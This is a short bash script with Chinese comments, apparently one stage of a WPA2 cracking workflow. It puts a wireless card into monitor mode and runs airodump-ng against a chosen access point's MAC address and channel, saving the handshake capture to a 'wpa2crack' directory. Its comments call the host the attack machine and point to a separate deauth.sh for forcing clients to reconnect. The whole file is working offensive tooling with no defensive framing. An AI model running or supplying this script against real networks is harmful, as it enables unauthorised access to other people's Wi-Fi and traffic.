#!/bin/bash
# capture.sh — 在攻击机上切 monitor 抓握手 (被动模式, 不发 deauth)
# 用法: sudo bash capture.sh <WIFI> <AP_MAC> <CHANNEL> <OUTPUT_DIR>
# 例:   sudo bash capture.sh wlp0s20f3 a8:93:4a:0b:51:27 6 /tmp/wpa2crack
set -e
WIFI="${1:-wlp0s20f3}"
AP_MAC="${2:?usage: capture.sh WIFI AP_MAC CHANNEL OUTDIR}"
CHANNEL="${3:?need channel}"
OUTDIR="${4:-/tmp/wpa2crack}"

# SSH 必须走有线/别的接口, 否则切 monitor 会断 SSH
ROUTE_IF=$(ip route get 192.168.2.113 2>/dev/null | grep -oE 'dev [a-z0-9]+' | awk '{print $2}')
if [ "$ROUTE_IF" = "$WIFI" ]; then
  echo "警告: SSH/管理流量走的就是 $WIFI, 切 monitor 会断连接. 换有线或别的网口." >&2
  exit 1
fi

mkdir -p "$OUTDIR"
cd "$OUTDIR"
rm -f capture-01.* 2>/dev/null

# 放手 NetworkManager
nmcli dev set "$WIFI" managed no 2>/dev/null || true
nmcli dev disconnect "$WIFI" 2>/dev/null || true
sleep 1
ip link set "$WIFI" down
iw dev "$WIFI" set type monitor
ip link set "$WIFI" up
echo "=== $WIFI 切到 monitor ==="
iw "$WIFI" info | grep -E "type|channel"

# 持续抓包, Ctrl-C 停
echo "=== 开始抓 $AP_MAC ch$CHANNEL (Ctrl-C 停止) ==="
echo "    需要客户端连入产生握手. 被动: 让手机点连接. 主动: 另开 deauth.sh"
airodump-ng -c "$CHANNEL" --bssid "$AP_MAC" -w capture --output-format pcap "$WIFI"
